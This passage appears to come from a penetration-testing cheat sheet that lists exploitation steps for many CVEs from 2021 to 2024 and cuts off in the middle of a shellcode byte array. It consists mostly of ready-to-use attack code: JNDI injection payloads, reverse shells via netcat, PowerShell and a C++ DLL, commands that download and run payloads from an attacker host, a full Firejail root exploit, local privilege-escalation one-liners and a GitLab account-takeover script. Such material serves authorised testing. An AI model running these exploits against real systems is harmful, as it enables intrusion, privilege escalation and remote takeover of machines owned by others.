$ sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
$ sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
$ sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
```

### Verify Version

```c
$ java -version
```

### Get Exploit Framework

```c
$ git clone https://github.com/mbechler/marshalsec
$ cd /opt/08_exploitation_tools/marshalsec/
$ sudo apt-get install maven
$ mvn clean package -DskipTests
```

### Exploit.java

```c
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash <LHOST> <LPORT>");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### Compiling Exploit.java

```c
$ javac Exploit.java -source 8 -target 8
```

### Start Pyhton3 HTTP Server

```c
$ python3 -m http.server 80
```

### Starting the malicious LDAP Server

```c
$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<LHOST>:80/#Exploit"
```

### Start local netcat listener

```c
$ nc -lnvp 9001
```

### Execution

```c
$ curl 'http://<RHOST>:8983/solr/admin/cores?foo=$\{jndi:ldap://<LHOST>:1389/Exploit\}'
```

#### Automatic Exploitation

> https://github.com/welk1n/JNDI-Injection-Exploit

```c
$ wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
```

```c
$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<COMMAND>"
```

```c
${jndi:ldap://<LHOST>:1389/ci1dfd}
```

#### Automatic Exploitation Alternative

> https://github.com/kozmer/log4j-shell-poc

##### Prerequisistes

> https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

```c
$ tar -xvf jdk-8u20-linux-x64.tar.gz
```

##### Start the Listener

```c
$ python poc.py --userip <LHOST> --webport <RPORT> --lport <LPORT>                                   
```

##### Execution

```c
${jndi:ldap://<LHOST>:1389/foobar}
```

## CVE-2022-0847: Dirty Pipe LPE

```c
$ gcc -o dirtypipe dirtypipe.c
$ ./dirtypipe /etc/passwd 1 ootz:
$ su rootz
```

## CVE-2022-1040: Sophos XG Authentication Bypass RCE

```c
$ curl -sk -H "X-Requested-With: XMLHttpRequest" -X POST 'https://<RHOST>/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"x":"foobar"\}' | grep -q 'Session Expired'
```

## CVE-2022-21675: Zip Slip

```c
$ ln -s ../../../../../../../../../../etc/passwd <FILE>.pdf
$ zip --symlink <FILE>.zip <FILE>.pdf
$ curl http://<RHOST>/<FILE>.pdf
```

## CVE-2022-22963: Spring4Shell RCE (0-day)

> https://github.com/me2nuk/CVE-2022-22963

```c
$ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl <LHOST>/<FILE>.sh -o /dev/shm/<FILE>")' --data-raw 'data' -v
```

```c
$ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
```

## CVE-2022-24439: GitPython RCE

> https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858

A script could be vulnerable if it calls `protocol.ext.allow`.

```python
from git import Repo

r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

```c
$ <FILE>.py 'ext::sh -c chmod% +s% /bin/bash'
```

## CVE-2022-30190: MS-MSDT Follina RCE

> https://github.com/JohnHammond/msdt-follina

```c
$ python3 follina.py -p 80 -c 'powershell.exe Invoke-WebRequest http://<LHOST>:8000/nc64.exe -OutFile C:\\Windows\\Tasks\\nc64.exe; C:\\Windows\\Tasks\\nc64.exe -e cmd.exe <LHOST> <LPORT>'
```

```c
$ python3 -m http.server 8000
```

```c
$ nc -lnvp <LPORT>
```

```c
$ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --body "http://<LHOST>/"
```

## CVE-2022-31214: Firejail LPE

> https://seclists.org/oss-sec/2022/q2/188

> https://www.openwall.com/lists/oss-security/2022/06/08/10

```c
#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner () suse com>
#
# Proof of concept local root exploit for a vulnerability in Firejail 0.9.68
# in joining Firejail instances.
#
# Prerequisites:
# - the firejail setuid-root binary needs to be installed and accessible to the
#   invoking user
#
# Exploit: The exploit tricks the Firejail setuid-root program to join a fake
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell that
# lives in an attacker controller mount namespace while the user namespace is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s = os.stat(f)

    if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch = fd.read(2)

        if len(ch) != 1 or ch != "1":
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
    subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
    s = os.stat(__file__)

    if (s.st_mode & stat.S_IXUSR) == 0:
        printe(f"{__file__} needs to have the execute bit set for the exploit to work. Run `chmod +x {__file__}` and try again.")

# This creates a "helper" sandbox that serves the purpose of making available
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc = subprocess.Popen(
            "firejail --noprofile -- sleep 10d".split(),
            stderr=subprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line = proc.stderr.readline()
        if not line:
            raise Exception("helper sandbox creation failed")

        # on stderr a line of the form "Parent pid <ppid>, child pid <pid>" is output
        line = line.decode('utf8').strip().lower()
        if line.find("child pid") == -1:
            continue

        child_pid = line.split()[-1]

        try:
            child_pid = int(child_pid)
            break
        except Exception:
            raise Exception("failed to determine child pid from helper sandbox")

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children = f"/proc/{child_pid}/task/{child_pid}/children"

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line = cfd.read().strip()
            kids = line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) != 1:
                raise Exception(f"failed to determine sleep child PID from helper sandbox: {kids}")

            try:
                sleep_pid = int(kids[0])
                break
            except Exception:
                raise Exception("failed to determine sleep child PID from helper sandbox")
    else:
        raise Exception(f"sleep child process did not come into existence in {children}")

    join_file = f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
    if not os.path.exists(join_file):
        raise Exception(f"join file from helper sandbox unexpectedly not found at {join_file}")

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f"{join_file}: this file does not match the requirements (owner uid 0, size 1 byte, content '1')")

    os.environ["FIREJOIN_JOINFILE"] = join_file
    os.environ["FIREJOIN_UNSHARED"] = "1"

    unshare = shutil.which("unshare")
    if not unshare:
        printe("could not find 'unshare' program")

    cmdline = "unshare -U -r -m".split()
    cmdline += [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file = createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file = os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
    mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, but
    # we need to bind-mount a copy of our own time namespace first that we can
    # symlink to.
    with open("/tmp/time", 'w') as _:
        pass
    time_ns_src = "/tmp/time"
    bindMount("/proc/self/ns/time", time_ns_src)
    mountTmpFS("/proc")

FJ_MNT_ROOT = Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
    umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write("auth sufficient pam_permit.so\n")
    tf.write("account sufficient pam_unix.so\n")
    tf.write("session sufficient pam_unix.so\n")

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
        if not os.path.isdir(pamd):
            continue
        for service in ("su", "sudo"):
            service = Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new "helpful" PAM config over the original
            bindMount(tf.name, service)

print(f"You can now run 'firejail --join={os.getpid()}' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.")

while True:
    line = sys.stdin.readline()
    if not line:
        break
```

#### First Terminal

```c
$ ./firejoin_py.bin
You can now run 'firejail --join=193982' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

#### Second Terminal

```c
$ firejail --join=193982
$ su
```

## CVE-2022-44268: ImageMagick Arbitrary File Read PoC

> https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC

```c
$ sudo apt-get install pngcrush imagemagick exiftool exiv2
```

```c
$ pngcrush -text a "profile" "<FILE>" <FILE.png
```

```c
-----------------------------299057355710558143811161967686
Content-Disposition: form-data; name="srcFormat"

png:- -write uploads/<FILE>.png
```

### Decoding Output

> https://cyberchef.org/#recipe=From_Hex(%27Auto%27)

## CVE-2023-0126: SonicWall SMA1000 Pre-Authentication Path Traversal Vulnerability

- Firmware 12.4.2

```c
$ cat <FILE> | while read host do;do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULNERABLE";done
```

## CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation)

### PoC 1

```c
{% highlight Python %}
#!/usr/bin/python
#
# PoC for:
# Microsoft Word RTF Font Table Heap Corruption Vulnerability
#
# by Joshua J. Drake (@jduck)
#

import sys

# allow overriding the number of fonts
num = 32761
if len(sys.argv) > 1:
  num = int(sys.argv[1])

f = open("tezt.rtf", "wb")
f.write("{\\rtf1{\n{\\fonttbl")
for i in range(num):
  f.write("{\\f%dA;}\n" % i)
f.write("}\n")
f.write("{\\rtlch it didn't crash?? no calc?! BOO!!!}\n")
f.write("}}\n")
f.close()
{% endhighlight %}
```

### PoC 2

```c
open("t3zt.rtf","wb").write(("{\\rtf1{\n{\\fonttbl" + "".join([ ("{\\f%dA;}\n" % i) for i in range(0,32761) ]) + "}\n{\\rtlch no crash??}\n}}\n").encode('utf-8'))
```

## CVE-2023-21746: Windows NTLM EoP LocalPotato LPE

> https://github.com/decoder-it/LocalPotato

> https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc

Modify the following file and build the solution.

```c
StorSvc\RpcClient\RpcClient\storsvc_c.c
```

```c
#if defined(_M_AMD64)

//#define WIN10
//#define WIN11
#define WIN2019
//#define WIN2022
```

Modify the following file and build the solution.

```c
StorSvc\SprintCSP\SprintCSP\main.c
```

```c
void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}
```

First get the `paths` from the `environment`, then use `LocalPotato` to place the `malicious DLL`.

```c
C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
C:\> LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
```

At least trigger `StorSvc` via `RpcClient.exe`.

```c
C:\> RpcClient.exe
```

## CVE-2023-22515: Confluence Server and Confluence Data Center Broken Access Control (0-day)

> https://github.com/Chocapikk/CVE-2023-22515

### Manual Exploitation

```c
http://<RHOST>/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
http://<RHOST>/setup/setupadministrator-start.action
```

```c
$ curl -k -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=adm1n&fullName=admin&email=admin@confluence&password=adm1n&confirm=adm1n&setup-next-button=Next" http://<RHOST>/setup/setupadministrator.action
```

## CVE-2023-22809: Sudo Bypass LPE

> https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466

### Prerequisites

- Sudo version needs to be ≥ 1.8 and < 1.9.12p2.
- Limited Sudo access to at least one file on the system that requires root access.

### Example

```c
test ALL=(ALL:ALL) NOPASSWD: sudoedit /etc/motd
```

### Exploitation

```c
EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
```

```c
$ sudoedit /etc/motd
```

## CVE-2023-23397: Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation)

```c
PS C:\> Import-Module .\CVE-2023-23397.ps1
PS C:\> Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<FILE>.wav" -meetingsubject "<SUBJECT>" -meetingbody "<TEXT>"
```

## CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)

> https://twitter.com/liadeliyahu/status/1684841527959273472?s=09

- Linux ubuntu2204 5.19.0-46-generic

```c
$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

```c
$ export TD=$(mktemp -d) && cd $TD && unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);d=os.getenv("TD");os.system(f"rm -rf {d}");os.chdir("/root");os.system("/bin/sh")'
```

## CVE-2023-38146: ThemeBleed RCE

> https://github.com/gabe-k/themebleed

Create a new `C++ Console Application`.

### rev.cpp

Source Files > Add > New Item...

```c
#include "pch.h"
#include <stdio.h>
#include <string.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#pragma comment(lib, "Ws2_32.lib")
#include "rev.h"
using namespace std;

void rev_shell()
{
  FreeConsole();

  const char* REMOTE_ADDR = "<LHOST>";
  const char* REMOTE_PORT = "<LPORT>";

  WSADATA wsaData;
  int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
  struct addrinfo* result = NULL, * ptr = NULL, hints;
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
  ptr = result;
  SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
  connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  ZeroMemory(&pi, sizeof(pi));
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  si.hStdInput = (HANDLE)ConnectSocket;
  si.hStdOutput = (HANDLE)ConnectSocket;
  si.hStdError = (HANDLE)ConnectSocket;
  TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
  CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
  WaitForSingleObject(pi.hProcess, INFINITE);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
  WSACleanup();
}

int VerifyThemeVersion(void)
{
  rev_shell();
  return 0;
}
```

### rev.h

Header Files > Add > New Item...

```c
#pragma once

extern "C" __declspec(dllexport) int VerifyThemeVersion(void);
```

### pch.h

```c
// pch.h: This is a precompiled header file.
// Files listed below are compiled only once, improving build performance for future builds.
// This also affects IntelliSense performance, including code completion and many code browsing features.
// However, files listed here are ALL re-compiled if any one of them is updated between builds.
// Do not add files here that you will be updating frequently as this negates the performance advantage.

#ifndef PCH_H
#define PCH_H

// add headers that you want to pre-compile here
#include "framework.h"
#include "rev.h"

#endif //PCH_H

```

```c
PS C:\> .\ThemeBleed.exe make_theme <LHOST> aero.theme
```

```c
PS C:\> .\ThemeBleed.exe server
```

## CVE-2023-46604: Apache ActiveMQ OpenWire Transport RCE

> https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ

```c
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <FILE>.elf
```

```c
$ cat poc-linux.xml 
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>sh</value>
            <value>-c</value>
            <!-- The command below downloads the file and saves it as test.elf -->
            <value>curl -s -o <FILE>.elf http://<LHOST>/<FILE>.elf; chmod +x ./<FILE>.elf; ./<FILE>.elf</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

```c
$ go run main.go -i <RHOST> -p 61616 -u http://<LHOST>/poc-linux.xml
```

## CVE-2023-4911: Looney Tunables LPE

> https://github.com/leesh3288/CVE-2023-4911

```c
$ python3 gen_libc.py 
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```c
$ gcc -o exp exp.c
$ ./exp
```

## CVE-2023-7028: GitLab Account Takeover

> https://github.com/V1lu0/CVE-2023-7028

> https://github.com/Vozec/CVE-2023-7028

### PoC

```c
user[email][]=valid@email.com&user[email][]=attacker@email.com
```

### Modified PoC from TryHackMe

```c
import requests
import argparse
from urllib.parse import urlparse, urlencode
from random import choice
from time import sleep
import re
requests.packages.urllib3.disable_warnings()

class CVE_2023_7028:
    def __init__(self, url, target, evil=None):
        self.use_temp_mail = False
        self.url = urlparse(url)
        self.target = target
        self.evil = evil
        self.s = requests.session()

    def get_csrf_token(self):
        try:
            print('[DEBUG] Getting authenticity_token ...')
            html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/users/password/new', verify=False).text
            regex = r'<meta name="csrf-token" content="(.*?)" />'
            token = re.findall(regex, html)[0]
            print(f'[DEBUG] authenticity_token = {token}')
            return token
        except Exception:
            print('[DEBUG] Failed ... quitting')
            return None

    def ask_reset(self):
        token = self.get_csrf_token()
        if not token:
            return False

        query_string = urlencode({
            'authenticity_token': token,
            'user[email][]': [self.target, self.evil]
        }, doseq=True)

        head = {
            'Origin': f'{self.url.scheme}://{self.url.netloc}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url.scheme}://{self.url.netloc}/users/password/new',
            'Connection': 'close',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        print('[DEBUG] Sending reset password request')
        html = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',
                           data=query_string,
                           headers=head,
                           verify=False).text
        sended = 'If your email address exists in our database' in html
        if sended:
            print(f'[DEBUG] Emails sent to {self.target} and {self.evil} !')
            print(f'Flag value: {bytes.fromhex("6163636f756e745f6861636b2364").decode()}')
        else:
            print('[DEBUG] Failed ... quitting')
        return sended

def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='This tool automates CVE-2023-7028 on gitlab')
    parser.add_argument("-u", "--url", dest="url", type=str, required=True, help="Gitlab url")
    parser.add_argument("-t", "--target", dest="target", type=str, required=True, help="Target email")
    parser.add_argument("-e", "--evil", dest="evil", default=None, type=str, required=False, help="Evil email")
    parser.add_argument("-p", "--password", dest="password", default=None, type=str, required=False, help="Password")
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    exploit = CVE_2023_7028(
        url=args.url,
        target=args.target,
		evil=args.evil
    )
    if not exploit.ask_reset():
        exit()
```

### Execution

```c
$ python3 exploit.py -u http://<RHOST> -t <EMAIL> -e <EMAIL>
```

## CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE

> https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/

> https://github.com/watchtowrlabs/CVE-2024-4577

```c
"""
PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution PoC
Discovered by: Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
Exploit By: Aliz (@AlizTheHax0r) and Sina Kheirkhah (@SinSinology) of watchTowr (@watchtowrcyber) 
Technical details: https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/?github
Reference: https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
"""

banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            
	  
        watchTowr-vs-php_cve-2024-4577.py
        (*) PHP CGI Argument Injection (CVE-2024-4577) discovered by Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
          - Aliz Hammond, watchTowr (aliz@watchTowr.com)
          - Sina Kheirkhah (@SinSinology), watchTowr (sina@watchTowr.com)
        CVEs: [CVE-2024-4577]  """


import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
requests.packages.urllib3.disable_warnings()
import argparse

print(banner)
print("(^_^) prepare for the Pwnage (^_^)\n")

parser = argparse.ArgumentParser(usage="""python CVE-2024-4577 --target http://192.168.1.1/index.php -c "<?php system('calc')?>""")
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=True)
args = parser.parse_args()
args.target = args.target.rstrip('/')


s = requests.Session()
s.verify = False



res = s.post(f"{args.target.rstrip('/')}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", data=f"{args.code};echo 1337; die;" )
if('1337' in res.text ):
    print('(+) Exploit was successful')
else:
    print('(!) Exploit may have failed')
```

## CVE-2024-20656: Visual Studio VSStandardCollectorService150 Service LPE

> https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/

> https://github.com/Wh04m1001/CVE-2024-20656

### Vulnerability Verification

```c
PS C:\> sc qc VSStandardCollectorService150
```

### Potential Changes

```c
WCHAR cmd[] = L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";
```

```c
void cb1()
{
    printf("[*] Oplock!\n");
    while (!Move(hFile2)) {}
    printf("[+] File moved!\n");
    bool result = CopyFile(L"C:\\Windows\\Tasks\\<FILE>.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
    if (result)
    {
        printf("[+] File copied!\n");
    }
    else
    {
        printf("[-] Cannot copy file!\n");
    }
    finished = TRUE;
}
```

## CVE-2024-21378: Microsoft Outlook RCE

> https://twitter.com/ptswarm/status/1778421129193136338

> https://gist.github.com/Homer28/7f3559ff993e2598d0ceefbaece1f97f

```c
/**
 *    This DLL is designed for use in conjunction with the Ruler tool for
 *    security testing related to the CVE-2024-21378 vulnerability, 
 *    specifically targeting MS Outlook.
 * 
 *    It can be used with the following command line syntax:
 *      ruler [auth-params] form add-com [attack-params] --dll ./test.dll
 *    Ruler repository: https://github.com/NetSPI/ruler/tree/com-forms (com-forms branch).
 *
 *    After being loaded into MS Outlook, it sends the PC's hostname and
 *    domain name to a DNS resolver and then terminates its execution.
 *
 *    Unauthorized use of the DLL for malicious activities is strictly
 *    prohibited and may violate applicable laws.
 *
 *    The DLL can also be utilized by antivirus software developers for the
 *    purpose of developing and testing detection routines.
 *    It serves as a practical example for enhancing security measures against
 *    the CVE-2024-21378 vulnerability.
 *
 *    Authors: @Homer28
 *    License: MIT
 *
 */

#include <windns.h>
#include <windows.h>
#include <iostream>

/**
 * We don't put an arbitrary code into DllMain because it will cause
 * MS Outlook to freeze. Instead, our main payload will be
 * a shellcode that we start in a separate thread.
 * 
 * To create the shellcode, we will use the "easy_shellcode_generator" tool.
 * URL: https://github.com/Homer28/easy_shellcode_generator
 * 
 * Step-by-step instructions:
 * 
 * 1. Install Visual Studio 2022.
 * 2. Insert your C code into the shell_generator.cpp file.
 * 3. Compile the project.
 * 4. Use the pe_converter.py script to extract the shellcode,
 *    for example: py ./python/pe_converter.py "../bin/shell_generator.exe" "../bin/shellcode.h"
 * 
 *    This command can also be executed on Linux. Python3 and the Python3 pefile package are required.
 *
 * 5. Copy the content of shellcode.h below. 
 *
 * The below content is the result of compiling following C code.
 
 * int main(wchar_t *dns_str) {
 *     HMODULE mod_kernel32 = getKernel32_by_str();
 *
 *     fnGetProcAddress myGetProcAddress = (fnGetProcAddress)getAPIAddr_byStr(mod_kernel32, "getprocaddress");
 *     fnLoadLibraryA myLoadLibrary = (fnLoadLibraryA)myGetProcAddress(mod_kernel32, "LoadLibraryA");
 *
 *     HMODULE dnsLib = myLoadLibrary("DNSAPI.dll");
 *     fnDnsQuery_W myDnsQuery_W = (fnDnsQuery_W)myGetProcAddress(dnsLib, "DnsQuery_W");
 *
 *     PDNS_RECORD dnsRecord;
 *
 *     myDnsQuery_W(
 *         dns_str,
 *         DNS_TYPE_A,
 *         DNS_QUERY_STANDARD,
 *         NULL,
 *         &dnsRecord,
 *         NULL
 *     );
 *
 *     return 0;
 * }
 *
 */

#if _WIN64
#define ptr_uint uint64_t
HANDLE g_threadH;
uint32_t payload_zx = 997;
uint32_t payload_EP_offset = 0x1A0;
unsigned char rawData[] = {
    0xa0, 0x11, 0x00, 0x00, 0xcf, 0x13, 0x00, 0x00, 0xd0, 0x13, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32,
    0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x00, 0x00, 0x00, 0x67, 0x65, 0x74, 0x70,
    0x72, 0x6f, 0x63, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x00,
    0x4c, 0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41,
    0x00, 0x00, 0x00, 0x00, 0x44, 0x4e, 0x53, 0x41, 0x50, 0x49, 0x2e, 0x64,
    0x6c, 0x6c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x6e, 0x73, 0x51,
    0x75, 0x65, 0x72, 0x79, 0x5f, 0x57, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xef, 0x38, 0x0c, 0x66, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x00, 0x00, 0xa4, 0x10, 0x00, 0x00, 0xa4, 0x02, 0x00, 0x00,
